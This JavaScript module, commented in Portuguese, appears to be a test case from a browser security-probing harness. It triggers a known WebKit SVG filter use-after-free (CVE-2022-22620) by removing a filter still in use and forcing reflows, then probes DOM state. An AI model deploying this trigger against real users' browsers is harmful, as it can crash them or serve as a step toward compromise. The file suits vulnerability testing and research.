/**
 * SC_SVG_FILTER_UAF.JS
 * Categoria : DOM/SVG — Use-After-Free
 * Alvo      : WebCore::SVGFilter / RenderSVGResourceFilter C++
 * Técnica   : Cria um SVG com <filter> aplicado via CSS filter,
 *             remove o SVG do DOM e força um reflow. O RenderObject
 *             pode manter ponteiro para o SVGFilter C++ depois que
 *             o elemento SVG é coletado, causando UAF na renderização.
 * Referência: CVE-2022-22620 (WebKit SVG filter UAF)
 */

export default {
    id:          'SVG_FILTER_UAF',
    category:    'DOM/SVG',
    risk:        'HIGH',
    description: 'RenderSVGResourceFilter retém ponteiro após remoção do SVG. '
                + 'Testa UAF no pipeline de renderização do WebCore.',

    /* ── estado interno ──────────────────────────────────────────────── */
    _container:  null,
    _svg:        null,
    _filter:     null,
    _target:     null,
    _filterId:   'uaf-filter-' + Math.floor(Math.random() * 0xFFFF).toString(16),

    supported: function() {
        return typeof SVGElement !== 'undefined';
    },

    /* ── setup ──────────────────────────────────────────────────────── */
    setup: async function() {
        this._container = document.createElement('div');
        document.body.appendChild(this._container);

        const ns = 'http://www.w3.org/2000/svg';

        // Cria SVG com filtro complexo
        this._svg = document.createElementNS(ns, 'svg');
        this._svg.setAttribute('width',  '100');
        this._svg.setAttribute('height', '100');
        this._svg.style.cssText = 'position:absolute;left:-9999px;width:100px;height:100px';

        // <defs> com <filter>
        const defs = document.createElementNS(ns, 'defs');
        this._filter = document.createElementNS(ns, 'filter');
        this._filter.id = this._filterId;
        this._filter.setAttribute('x', '0%');
        this._filter.setAttribute('y', '0%');
        this._filter.setAttribute('width', '100%');
        this._filter.setAttribute('height', '100%');

        // Primitivas de filtro encadeadas
        const feGaussian = document.createElementNS(ns, 'feGaussianBlur');
        feGaussian.setAttribute('stdDeviation', '2');
        feGaussian.setAttribute('result', 'blurred');

        const feColorMatrix = document.createElementNS(ns, 'feColorMatrix');
        feColorMatrix.setAttribute('type', 'saturate');
        feColorMatrix.setAttribute('values', '0');
        feColorMatrix.setAttribute('in', 'blurred');

        this._filter.appendChild(feGaussian);
        this._filter.appendChild(feColorMatrix);
        defs.appendChild(this._filter);
        this._svg.appendChild(defs);

        // Elemento que aplica o filtro
        const rect = document.createElementNS(ns, 'rect');
        rect.setAttribute('width', '100');
        rect.setAttribute('height', '100');
        rect.setAttribute('fill', 'blue');
        rect.setAttribute('filter', `url(#${this._filterId})`);
        this._svg.appendChild(rect);

        this._container.appendChild(this._svg);

        // Elemento HTML que referencia o filtro SVG via CSS
        this._target = document.createElement('div');
        this._target.style.cssText = `
            width: 60px; height: 60px;
            background: red;
            filter: url(#${this._filterId});
            position: absolute; left: -9999px;
        `;
        this._container.appendChild(this._target);

        void this._container.offsetWidth; // força render do filtro
        await new Promise(r => requestAnimationFrame(r));
        await new Promise(r => setTimeout(r, 20));
    },

    /* ── trigger ─────────────────────────────────────────────────────── */
    trigger: async function() {
        // Remove o SVG (libera o SVGFilter C++ e o RenderSVGResourceFilter)
        this._svg.remove();

        // Força reflow — o _target ainda tem filter: url(#...) apontando
        // para um filtro que não existe mais no DOM
        void this._container.offsetWidth;
        void this._target.offsetWidth;

        // Modifica o CSS do target para re-aplicar o filtro
        try {
            this._target.style.filter = `url(#${this._filterId}) blur(0px)`;
            void this._target.offsetWidth;
        } catch(_) {}

        // Remove também o target
        this._target.remove();
        void document.body.offsetWidth;

        await new Promise(r => requestAnimationFrame(r));
        await new Promise(r => setTimeout(r, 20));
    },

    /* ── probes ──────────────────────────────────────────────────────── */
    probe: [
        // [0-3] estado do SVG após remoção
        s => s._svg.isConnected,
        s => s._svg.ownerDocument === document,
        s => s._filter.isConnected,
        s => s._filter.id,

        // [4-7] propriedades do filter element
        s => s._filter.getAttribute('x'),
        s => s._filter.childNodes.length,
        s => typeof s._filter,
        s => s._filter instanceof SVGElement,

        // [8-10] target HTML com filter referenciando SVG removido
        s => s._target.isConnected,
        s => s._target.style.filter,
        s => window.getComputedStyle(s._target)?.filter ?? 'null',

        // [11] container intacto
        s => s._container.isConnected,
        s => s._container.children.length,
    ],

    /* ── cleanup ─────────────────────────────────────────────────────── */
    cleanup: async function() {
        this._container?.remove();
        this._container = null;
        this._svg       = null;
        this._filter    = null;
        this._target    = null;
    }
};
